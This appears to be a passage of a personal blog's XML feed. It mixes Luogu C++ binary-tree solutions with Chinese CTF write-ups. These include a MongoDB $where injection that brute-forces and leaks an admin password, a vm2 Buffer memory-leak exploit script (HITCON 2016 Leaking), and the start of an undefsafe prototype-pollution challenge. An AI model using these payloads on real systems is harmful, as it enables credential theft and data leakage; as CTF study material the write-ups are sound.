        <tag>比赛复现</tag>
      </tags>
  </entry>
  <entry>
    <title>P1827 [USACO3.4] 美国血统 American Heritage</title>
    <url>/2025/06/02/P1827%20%5BUSACO3.4%5D%20%E7%BE%8E%E5%9B%BD%E8%A1%80%E7%BB%9F%20American%20Heritage/</url>
    <content><![CDATA[<h1 id="P1827-USACO3-4-美国血统-American-Heritage"><a href="#P1827-USACO3-4-美国血统-American-Heritage" class="headerlink" title="P1827 [USACO3.4] 美国血统 American Heritage"></a>P1827 [USACO3.4] 美国血统 American Heritage</h1><p>这个题其实就是给出一个<strong>二叉树的先序遍历和中序遍历</strong>输出序列，要求输出<strong>后序遍历</strong>的题。</p>
<p>这里需要讲解几个STL库函数，STL的sting类型自带切割方法substr，需要记住两个参数，order 和 k 。</p>
<p>函数将会从下标为order的位置开始，连续获取k个字符。返回获取后的字符串，order显然不能超过目标字符串的长度，但是如果order+k超过了s.size()-1，函数会自动只获取到s的末尾。如果不传入k，那么默认获取到末尾。</p>
<p><strong>这个函数是返回一个字符串，而不是对s进行改动。</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s;</span><br><span class="line">s.<span class="built_in">substr</span>(order,k);</span><br></pre></td></tr></table></figure>

<p>下面是关于查找和删除的方法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">s.<span class="built_in">find</span>(c);<span class="comment">//在字符串s中查找第一个字符的位置，返回下标，如果没有返回string::npos</span></span><br><span class="line">s.<span class="built_in">erase</span>(it);<span class="comment">//在字符串中删除指针it所指向的字符</span></span><br><span class="line">s.<span class="built_in">begin</span>();<span class="comment">//返回s的首字符的指针（迭代器）</span></span><br></pre></td></tr></table></figure>

<p>实现流程：</p>
<ol>
<li>先确定当前子树的根节点</li>
<li>再中序中找到根节点的位置，将其分为左子树中序（0—k-1），右子树中序（k+1—end)</li>
<li>删除前序序列中根节点的位置，剩余前序有左子树前序（前k个字符，长度与左子树中序一致），右子树前序（剩余字符，长度与右子树中序一致）</li>
<li>对左子树和右子树分别递归调用work，进一步分割处理</li>
<li>输出根节点（左-右-根）</li>
</ol>
<p>下面是完整代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">string pre,inor;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">work</span><span class="params">(string pre,string inor)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(pre.<span class="built_in">empty</span>())<span class="keyword">return</span> ;<span class="comment">//如果序列空，返回</span></span><br><span class="line">	<span class="type">char</span> root=pre[<span class="number">0</span>];<span class="comment">//找出根节点</span></span><br><span class="line">	<span class="type">int</span> k=inor.<span class="built_in">find</span>(root);<span class="comment">//找到中序节点根节点的位置</span></span><br><span class="line">	pre.<span class="built_in">erase</span>(pre.<span class="built_in">begin</span>());<span class="comment">//删除根节点的位置</span></span><br><span class="line">	string leftpre=pre.<span class="built_in">substr</span>(<span class="number">0</span>,k);<span class="comment">//找出根节点的左子树</span></span><br><span class="line">	string rightpre=pre.<span class="built_in">substr</span>(k);<span class="comment">//找出根节点的右子树</span></span><br><span class="line">	string leftinor=inor.<span class="built_in">substr</span>(<span class="number">0</span>,k);</span><br><span class="line">	string rightinor=inor.<span class="built_in">substr</span>(k<span class="number">+1</span>);</span><br><span class="line">	<span class="built_in">work</span>(leftpre,leftinor);</span><br><span class="line">	<span class="built_in">work</span>(rightpre,rightinor);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,root); </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	cin&gt;&gt;inor&gt;&gt;pre;</span><br><span class="line">	<span class="built_in">work</span>(pre,inor);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>洛谷题解</category>
      </categories>
      <tags>
        <tag>洛谷题解</tag>
        <tag>c++</tag>
        <tag>链表</tag>
        <tag>二叉树的遍历</tag>
      </tags>
  </entry>
  <entry>
    <title>[2021祥云杯]Package Manager 2021</title>
    <url>/2025/05/27/%5B2021%E7%A5%A5%E4%BA%91%E6%9D%AF%5DPackage%20Manager%202021/</url>
    <content><![CDATA[<p> 预期解我看不懂</p>
<p>这里记录了两个非预期解</p>
<p><a href="https://haoami.github.io/2021/08/30/2021-8-30-%E7%A5%A5%E4%BA%91%E6%9D%AF/#%E9%9D%9E%E9%A2%84%E6%9C%9F">祥云杯 - KKfine’s blog</a></p>
<p> 这个题有附件，下载</p>
<p>里面好多ts和pug文件</p>
<p>打开题目</p>
<p>开局502</p>
<p>后面看题解才知道是需要下载依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnpm install</span><br></pre></td></tr></table></figure>

<p><img src="/../images/20250527210337116.png" alt="image-20250527210337116"></p>
<p>有登录注册</p>
<p>还有个auth</p>
<p><img src="/../images/20250527210903931.png" alt="image-20250527210903931"></p>
<h2 id="mongodb注入"><a href="#mongodb注入" class="headerlink" title="mongodb注入"></a>mongodb注入</h2><p>通过<code>schema.ts</code>可以知道用的是<code>mongoDB</code>数据库</p>
<p><a href="https://so.csdn.net/so/search?q=Mongoose&spm=1001.2101.3001.7020">Mongoose</a> 是一个让我们可以通过Node来操作<a href="https://so.csdn.net/so/search?q=MongoDB%E6%95%B0%E6%8D%AE%E5%BA%93&spm=1001.2101.3001.7020">MongoDB数据库</a>的一个模块</p>
<p><img src="/../images/20250527210428890.png" alt="image-20250527210428890"></p>
<p>然后在index.ts中的<code>/auth</code>路由存在<a href="https://so.csdn.net/so/search?q=sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">sql注入漏洞</a></p>
<p>index.ts:</p>
<figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/auth&#x27;</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>))</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/auth&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; token &#125; = req.<span class="property">body</span>;</span><br><span class="line">	<span class="keyword">if</span> (token !== <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="title function_">typeof</span> (token) === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_">checkmd5Regex</span>(token)) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				<span class="comment">//这里存在sql注入漏洞</span></span><br><span class="line">				<span class="keyword">let</span> docs = <span class="keyword">await</span> <span class="title class_">User</span>.$where(<span class="string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;<span class="subst">$&#123;token.toString()&#125;</span>&quot;`</span>).<span class="title function_">exec</span>()</span><br><span class="line">				<span class="variable language_">console</span>.<span class="title function_">log</span>(docs);</span><br><span class="line">				<span class="keyword">if</span> (docs.<span class="property">length</span> == <span class="number">1</span>) &#123;</span><br><span class="line">					<span class="keyword">if</span> (!(docs[<span class="number">0</span>].<span class="property">isAdmin</span> === <span class="literal">true</span>)) &#123;</span><br><span class="line">						<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Failed to auth&#x27;</span> &#125;)</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;No matching results&#x27;</span> &#125;)</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">				<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: err &#125;)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Token must be valid md5 string&#x27;</span> &#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Parameters error&#x27;</span> &#125;)</span><br><span class="line">	&#125;</span><br><span class="line">	req.<span class="property">session</span>.<span class="property">AccessGranted</span> = <span class="literal">true</span></span><br><span class="line">	res.<span class="title function_">redirect</span>(<span class="string">&#x27;/packages/submit&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现在注入漏洞之前还有一个checkmd5Regex函数来检验token</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const checkmd5Regex = (token: string) =&gt; &#123;</span><br><span class="line">  return /([a-f\d]&#123;32&#125;|[A-F\d]&#123;32&#125;)/.exec(token);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在正则匹配的时候，没有用<code>^$</code>匹配头部或者尾部，所以存在绕过</p>
<p>只需要在token的前面放上一串32长度的字符串<code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code>，就可以满足这个匹配</p>
<p>这里大佬的解法是写个脚本直接把admin的密码爆出来了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = &quot;http://b5c92fb4-2133-499b-ae04-4dadb381e5bf.node4.buuoj.cn:81/auth&quot;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47&quot;,</span><br><span class="line">    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;,</span><br><span class="line">    &quot;Referer&quot;: &quot;http://b5c92fb4-2133-499b-ae04-4dadb381e5bf.node4.buuoj.cn:81/auth&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;,</span><br><span class="line">    &quot;Cookie&quot;: &quot;UM_distinctid=17f8d34a7f932c-0e50148d0f032b-56171d51-144000-17f8d34a7fae31; session=s%3A9hzuyZljr-wg3Dt2h0JoUGgeTX1uugga.e27PI%2Bcl9%2FuQQ1%2BqtdpsqVKjKtpSuFaq0lDZzPHEMVY&quot;,</span><br><span class="line">    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">&#125;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(100):</span><br><span class="line">    print(i)</span><br><span class="line">    for j in string.printable:</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;_csrf&quot;:&quot;sTH9KGXQ-zU7GcLfhx27sRaW9gCxEIqaFWrQ&quot;,</span><br><span class="line">            &quot;token&quot;:&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;||this.password[&#123;&#125;]==&quot;&#123;&#125;&#x27;.format(i,j),</span><br><span class="line">        &#125;</span><br><span class="line">        # print(data)</span><br><span class="line">        r = requests.post(url = url ,headers= headers,data=data,allow_redirects=False)</span><br><span class="line">        if &quot;Found. Redirecting to&quot;  in r.text:</span><br><span class="line">            flag  = flag+j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line"># print(string.printable)</span><br><span class="line"># 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~ </span><br></pre></td></tr></table></figure>

<p><img src="/../images/20250527211057174.png" alt="image-20250527211057174"></p>
<p>然后直接登录</p>
<h2 id="抛出异常"><a href="#抛出异常" class="headerlink" title="抛出异常"></a>抛出异常</h2><p><a href="https://so.csdn.net/so/search?q=MongoDB&spm=1001.2101.3001.7020">MongoDB</a>支持js的语法，所以可以用js语法去抛出内容为admin密码的异常。</p>
<p>token输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;||</span><br><span class="line">(()=&gt;&#123;throw Error(this.password)&#125;)()==&quot;admin</span><br></pre></td></tr></table></figure>

<p><img src="/../images/20250527211337458.png" alt="image-20250527211337458"></p>
<p>得到admin的密码</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>mongodb注入</tag>
        <tag>抛出异常</tag>
      </tags>
  </entry>
  <entry>
    <title>P5076 【深基16.例7】普通二叉树（简化版）</title>
    <url>/2025/06/02/P5076%20%E3%80%90%E6%B7%B1%E5%9F%BA16.%E4%BE%8B7%E3%80%91%E6%99%AE%E9%80%9A%E4%BA%8C%E5%8F%89%E6%A0%91%EF%BC%88%E7%AE%80%E5%8C%96%E7%89%88%EF%BC%89/</url>
    <content><![CDATA[<h1 id="P5076-【深基16-例7】普通二叉树（简化版）"><a href="#P5076-【深基16-例7】普通二叉树（简化版）" class="headerlink" title="P5076 【深基16.例7】普通二叉树（简化版）"></a>P5076 【深基16.例7】普通二叉树（简化版）</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>您需要写一种数据结构，来维护一些数（都是绝对值 10^9 以内的数）的集合，最开始时集合是空的。其中需要提供以下操作，操作次数 q 不超过 10^4：</p>
<ol>
<li>定义数 x 的排名为集合中小于 x 的数的个数 +1。查询数 x 的排名。<strong>注意 x 不一定在集合里</strong>。</li>
<li>查询排名为 x 的数。<strong>保证集合里至少有 x 个数</strong>。</li>
<li>求 x 的前驱（前驱定义为小于 x，且最大的数）。若不存在则输出 -2147483647。</li>
<li>求 x 的后继（后继定义为大于 x，且最小的数）。若不存在则输出 2147483647。</li>
<li>插入一个数 x，本题的数据保证插入前 x 不在集合中。</li>
</ol>
<p>保证执行 1,3,4 操作时，集合中有至少一个元素。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>第一行是一个整数 q，表示操作次数。</p>
<p>接下来 q 行，每行两个整数 op,x，分别表示操作序号以及操作的参数 x。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出有若干行。对于操作 1,2,3,4，输出一个整数，表示该操作的结果。</p>
<h2 id="输入输出样例-1"><a href="#输入输出样例-1" class="headerlink" title="输入输出样例 #1"></a>输入输出样例 #1</h2><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入 #1"></a>输入 #1</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">5</span> <span class="number">1</span></span><br><span class="line"><span class="number">5</span> <span class="number">3</span></span><br><span class="line"><span class="number">5</span> <span class="number">5</span></span><br><span class="line"><span class="number">1</span> <span class="number">3</span></span><br><span class="line"><span class="number">2</span> <span class="number">2</span></span><br><span class="line"><span class="number">3</span> <span class="number">3</span></span><br><span class="line"><span class="number">4</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>

<h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出 #1"></a>输出 #1</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure>





<h2 id="平衡二叉树的各种迷惑操作："><a href="#平衡二叉树的各种迷惑操作：" class="headerlink" title="平衡二叉树的各种迷惑操作："></a>平衡二叉树的各种迷惑操作：</h2><p>节点结构：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> val,ls,rs,cnt,siz;</span><br><span class="line">    <span class="comment">//当前节点的权值</span></span><br><span class="line">    <span class="comment">//左孩子，如果没有则为0</span></span><br><span class="line">    <span class="comment">//右孩子的下标，如果没有则为0</span></span><br><span class="line">    <span class="comment">//计数器，代表当前的值出现了几遍</span></span><br><span class="line">    <span class="comment">//子树大小和自己大小的和</span></span><br><span class="line">&#125;tree[<span class="number">500010</span>];</span><br></pre></td></tr></table></figure>

<p>插入：</p>
<p>x是当前节点的下标，v是要插入的值。要在树上插入一个v的值，就要找到一个合适的位置，如果已经这个值的节点就把计数器加1，否则一直向下寻找直到找到叶子节点，这个时候就可以从这个叶子节点连出一个儿子，代表v的节点。具体向下寻找该走左儿子还是右儿子是根据二叉搜索树的性质来的。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> v)</span></span>&#123;</span><br><span class="line">    tree[x].siz++;</span><br><span class="line">    <span class="keyword">if</span>(tree[x].val==v)&#123;</span><br><span class="line">        tree[x].cnt++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(tree[x].val&gt;v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(tree[x].ls!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">add</span>(tree[x].ls,v);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cont++;</span><br><span class="line">            tree[cont].val=v;</span><br><span class="line">            tree[cont].siz=tree[cont].cnt=<span class="number">1</span>;</span><br><span class="line">            tree[x].ls=cont;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(tree[x].rs!=<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">add</span>(tree[x].rs,v);</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cont++;</span><br><span class="line">            tree[cont].val=v;</span><br><span class="line">            tree[cont].siz=tree[cont].cnt=<span class="number">1</span>;</span><br><span class="line">            tree[x].rs=cont;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>洛谷题解</category>
      </categories>
      <tags>
        <tag>洛谷题解</tag>
        <tag>c++</tag>
        <tag>链表</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>[HITCON 2016]Leaking</title>
    <url>/2025/05/23/%5BHITCON%202016%5DLeaking/</url>
    <content><![CDATA[<p> 源码+注释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;; // 启用严格模式，增强代码安全性，禁止某些不安全的语法</span><br><span class="line"></span><br><span class="line">// 引入所需模块</span><br><span class="line">var randomstring = require(&quot;randomstring&quot;); // 用于生成随机字符串</span><br><span class="line">var express = require(&quot;express&quot;); // Express框架，用于创建Web服务器</span><br><span class="line">var &#123; VM &#125; = require(&quot;vm2&quot;); // 沙箱环境模块，用于安全执行代码</span><br><span class="line">var fs = require(&quot;fs&quot;); // 文件系统模块</span><br><span class="line"></span><br><span class="line">var app = express(); // 创建Express应用实例</span><br><span class="line">var flag = require(&quot;./config.js&quot;).flag // 从配置文件导入flag（敏感信息）</span><br><span class="line"></span><br><span class="line">// 定义根路由处理</span><br><span class="line">app.get(&quot;/&quot;, function(req, res) &#123;</span><br><span class="line">    res.header(&quot;Content-Type&quot;, &quot;text/plain&quot;); // 设置响应头为纯文本</span><br><span class="line"></span><br><span class="line">    /* </span><br><span class="line">       Orange故意在此处暴露flag，但通过动态变量名保护：</span><br><span class="line">       1. 生成64位随机字符串作为变量名部分</span><br><span class="line">       2. 拼接成 flag_[随机字符串] 的变量名</span><br><span class="line">       3. 实际flag值用hitcon&#123;&#125;包裹</span><br><span class="line">    */</span><br><span class="line">    eval(&quot;var flag_&quot; + randomstring.generate(64) + &quot; = \&quot;hitcon&#123;&quot; + flag + &quot;&#125;\&quot;;&quot;)</span><br><span class="line"></span><br><span class="line">    // 检查请求中是否有data参数且长度&lt;=12</span><br><span class="line">    if (req.query.data &amp;&amp; req.query.data.length &lt;= 12) &#123;</span><br><span class="line">        // 创建沙箱环境（限制执行时间1秒）</span><br><span class="line">        var vm = new VM(&#123;</span><br><span class="line">            timeout: 1000</span><br><span class="line">        &#125;);</span><br><span class="line">        console.log(req.query.data); // 打印用户输入（用于调试）</span><br><span class="line">        // 在沙箱中执行用户输入的data参数</span><br><span class="line">        res.send(&quot;eval -&gt;&quot; + vm.run(req.query.data));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 如果无参数或长度超标，返回当前文件源代码</span><br><span class="line">        res.send(fs.readFileSync(__filename).toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 启动服务器监听3000端口</span><br><span class="line">app.listen(3000, function() &#123;</span><br><span class="line">    console.log(&quot;listening on port 3000!&quot;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>看到里面引入了VM，猜测是VM沙箱逃逸</p>
<p>大致说一下 题目的描述，首先定义变量flag，然后我们可以在沙箱里面执行任意的命令，那我们如何逃逸出去呢?</p>
<p><strong>知识点：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在较早一点的 node 版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。</span><br></pre></td></tr></table></figure>

<p>这儿的环境是8.0之前的，所以我们使用Buffer()来读取内存，这个和Linux读内存原理差不多，只要调用过的变量，都会存在内存中，那么我们可以构造paylaod读取内存</p>
<p>EXP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># encoding=utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &#x27;http://402a95ea-15ad-46a2-be88-35e62822cb27.node3.buuoj.cn/?data=Buffer(500)&#x27;</span><br><span class="line">response = &#x27;&#x27;</span><br><span class="line">while &#x27;flag&#x27; not in response:</span><br><span class="line">        req = requests.get(url)</span><br><span class="line">        response = req.text</span><br><span class="line">        print(req.status_code)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        if &#x27;flag&#123;&#x27; in response:</span><br><span class="line">            print(response)</span><br><span class="line">            break </span><br></pre></td></tr></table></figure>

<p><img src="/../images/20250523150425941.png" alt="image-20250523150425941"></p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>NodeJs</tag>
        <tag>VM沙箱逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>[网鼎杯 2020 青龙组]notes</title>
    <url>/2025/05/23/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Dnotes/</url>
    <content><![CDATA[<p>  <strong>考点：undefsafe函数导致的原型链污染</strong></p>
<h2 id="源码-注释："><a href="#源码-注释：" class="headerlink" title="源码+注释："></a>源码+注释：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 引入Express框架用于构建Web应用</span><br><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">// 引入Path模块用于处理文件路径</span><br><span class="line">var path = require(&#x27;path&#x27;);</span><br><span class="line">// 引入undefsafe库，用于安全访问对象深层属性</span><br><span class="line">const undefsafe = require(&#x27;undefsafe&#x27;);</span><br><span class="line">// 引入child_process模块的exec方法，用于执行系统命令</span><br><span class="line">const &#123; exec &#125; = require(&#x27;child_process&#x27;);</span><br><span class="line"></span><br><span class="line">// 创建Express应用实例</span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">// 定义笔记类</span><br><span class="line">class Notes &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.owner = &quot;whoknows&quot;;  // 笔记所有者，默认&quot;whoknows&quot;</span><br><span class="line">        this.num = 0;             // 笔记计数器，从0开始</span><br><span class="line">        this.note_list = &#123;&#125;;      // 存储笔记的字典对象</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 添加笔记方法</span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        // 以当前计数器值为键，存储作者和笔记内容</span><br><span class="line">        this.note_list[(this.num++).toString()] = &#123;&quot;author&quot;: author,&quot;raw_note&quot;:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取单个笔记方法</span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        var r = &#123;&#125;</span><br><span class="line">        // 使用undefsafe安全访问笔记内容</span><br><span class="line">        undefsafe(r, id, undefsafe(this.note_list, id));</span><br><span class="line">        return r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 编辑笔记方法</span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        // 使用undefsafe安全修改作者和内容</span><br><span class="line">        undefsafe(this.note_list, id + &#x27;.author&#x27;, author);</span><br><span class="line">        undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取所有笔记方法</span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        return this.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 删除笔记方法</span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        delete this.note_list[id];  // 删除指定ID的笔记</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 创建Notes实例并添加一条示例笔记</span><br><span class="line">var notes = new Notes();</span><br><span class="line">notes.write_note(&quot;nobody&quot;, &quot;这是nobody的第一条笔记&quot;);</span><br><span class="line"></span><br><span class="line">// 配置Express视图设置</span><br><span class="line">app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));  // 设置视图文件目录</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;pug&#x27;);                   // 设置模板引擎为Pug</span><br><span class="line"></span><br><span class="line">// 配置中间件</span><br><span class="line">app.use(express.json());                          // 解析JSON格式请求体</span><br><span class="line">app.use(express.urlencoded(&#123; extended: false &#125;)); // 解析URL编码请求体</span><br><span class="line">app.use(express.static(path.join(__dirname, &#x27;public&#x27;))); // 设置静态文件目录</span><br><span class="line"></span><br><span class="line">// 定义首页路由</span><br><span class="line">app.get(&#x27;/&#x27;, function(req, res, next) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;, &#123; title: &#x27;笔记本&#x27; &#125;);  // 渲染首页视图</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 添加笔记路由</span><br><span class="line">app.route(&#x27;/add_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;  // GET请求处理</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &#x27;请使用POST方法添加笔记&#x27;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;  // POST请求处理</span><br><span class="line">        let author = req.body.author;  // 获取作者参数</span><br><span class="line">        let raw = req.body.raw;        // 获取笔记内容</span><br><span class="line">        if (author &amp;&amp; raw) &#123;           // 验证参数存在</span><br><span class="line">            notes.write_note(author, raw);  // 调用添加方法</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;添加笔记成功&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;添加笔记失败&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">// 编辑笔记路由</span><br><span class="line">app.route(&#x27;/edit_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &quot;请使用POST方法编辑笔记&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;         // 获取笔记ID</span><br><span class="line">        let author = req.body.author;  // 获取作者</span><br><span class="line">        let enote = req.body.raw;      // 获取新内容</span><br><span class="line">        if (id &amp;&amp; author &amp;&amp; enote) &#123;   // 验证参数</span><br><span class="line">            notes.edit_note(id, author, enote);  // 调用编辑方法</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;编辑笔记成功&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;编辑笔记失败&quot;&#125;);</span><br><span class="line">        